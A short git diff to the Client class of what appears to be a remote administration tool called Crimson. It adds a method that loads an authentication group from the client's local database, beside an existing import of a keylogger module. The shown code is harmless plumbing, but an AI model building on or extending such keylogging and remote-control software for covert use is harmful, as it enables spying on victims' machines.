@@ -27,6 +27,7 @@ import com.subterranean_security.crimson.client.modules.Keylogger.RefreshMethod;
 import com.subterranean_security.crimson.core.Common;
 import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
 import com.subterranean_security.crimson.core.storage.ClientDB;
+import com.subterranean_security.crimson.core.util.AuthenticationGroup;
 import com.subterranean_security.crimson.core.util.B64;
 import com.subterranean_security.crimson.core.util.CUtil;
 import com.subterranean_security.crimson.core.util.EH;
@@ -77,6 +78,16 @@ public class Client {
 		ClientStore.Connections.setPeriod(ic.getReconnectPeriod());
 		ClientStore.Connections.connectionRoutine();
 
+	}
+
+	public static AuthenticationGroup getGroup() {
+		try {
+			return (AuthenticationGroup) clientDB.getObject("auth.group");
+		} catch (Exception e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		return null;
 	}
 
 }
